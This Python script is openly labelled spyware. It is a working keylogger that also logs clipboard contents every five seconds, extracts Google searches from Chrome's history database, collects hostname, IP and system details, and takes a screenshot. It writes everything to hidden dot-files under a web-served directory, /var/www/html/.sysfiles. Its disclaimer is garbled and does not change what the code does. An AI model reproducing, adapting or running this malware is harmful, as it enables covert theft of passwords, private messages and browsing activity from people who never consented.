#!/usr/bin/python3

# _*_ coding: utf-8 _*_
# Tested on Linux (e.g., Linux kali 6.5.0-kali2-amd64)

# DISCLAIMER
# This script is only for ethical and Unauthorized use of keyloggers is illegal.
# The author of this program will not be responsible for any kind of malicious activity.

import os
import socket
import platform
import threading
import time
from datetime import datetime
from pynput import keyboard
import pandas as pd
from PIL import ImageGrab
import pyperclip
import sqlite3

# Define file paths
HIDDEN_DIR = "/var/www/html/.sysfiles"
if not os.path.exists(HIDDEN_DIR):
    os.makedirs(HIDDEN_DIR)

KEYSTROKE_LOG = os.path.join(HIDDEN_DIR, ".logs.txt")
CLIPBOARD_LOG = os.path.join(HIDDEN_DIR, ".clipboard.txt")
SEARCH_HISTORY_LOG = os.path.join(HIDDEN_DIR, ".search_history.xlsx")
SYSTEM_INFO_LOG = os.path.join(HIDDEN_DIR, ".system_info.xlsx")
SCREENSHOT_LOG = os.path.join(HIDDEN_DIR, ".screenshot.png")

# Print the exact paths for verification
print(f"Keystroke log file: {KEYSTROKE_LOG}")
print(f"Clipboard log file: {CLIPBOARD_LOG}")
print(f"Search history log file: {SEARCH_HISTORY_LOG}")
print(f"System info log file: {SYSTEM_INFO_LOG}")
print(f"Screenshot file: {SCREENSHOT_LOG}")

# Function to log keystrokes
def log_keystrokes():
    keys = []

    def on_press(key):
        keys.append(key)
        write_file(keys)
        keys.clear()

    def write_file(keys):
        with open(KEYSTROKE_LOG, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                elif k.find("Key") == -1:
                    f.write(k)
    
    def on_release(key):
        if key == keyboard.Key.esc:
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function to log clipboard data
def log_clipboard():
    recent_value = ""
    while True:
        try:
            tmp_value = pyperclip.paste()
            if tmp_value != recent_value:
                recent_value = tmp_value
                with open(CLIPBOARD_LOG, "a") as f:
                    f.write(f"Clipboard Data at {datetime.now()}:\n{tmp_value}\n\n")
            time.sleep(5)
        except Exception as e:
            print(f"Clipboard logging error: {e}")

# Function to log Google Chrome search history
def log_search_history():
    try:
        path_to_history = os.path.expanduser("~/.config/google-chrome/Default/History")
        conn = sqlite3.connect(path_to_history)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch') AS last_visit_time FROM urls WHERE url LIKE '%google.com%'")
        search_history = cursor.fetchall()
        df = pd.DataFrame(search_history, columns=['URL', 'Title', 'Timestamp'])
        df.to_excel(SEARCH_HISTORY_LOG, index=False)
        conn.close()
    except Exception as e:
        print(f"Search history logging error: {e}")

# Function to log system information
def log_system_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        system_info = platform.uname()
        data = {
            'Metric': ['Date', 'Hostname', 'IP Address', 'System', 'Node Name', 'Release', 'Version', 'Machine', 'Processor'],
            'Value': [datetime.now(), hostname, ip_address, system_info.system, system_info.node, system_info.release, system_info.version, system_info.machine, system_info.processor]
        }
        df = pd.DataFrame(data)
        df.to_excel(SYSTEM_INFO_LOG, index=False)
    except Exception as e:
        print(f"System information logging error: {e}")

# Function to take a screenshot
def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(SCREENSHOT_LOG)
    except Exception as e:
        print(f"Screenshot error: {e}")

# Main function to start threads for each logging function
def main():
    try:
        threading.Thread(target=log_keystrokes, daemon=True).start()
        threading.Thread(target=log_clipboard, daemon=True).start()
        threading.Thread(target=log_search_history, daemon=True).start()
        threading.Thread(target=log_system_info, daemon=True).start()

        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        take_screenshot()
        print("Spyware terminated and screenshot taken.")

if __name__ == "__main__":
    main()
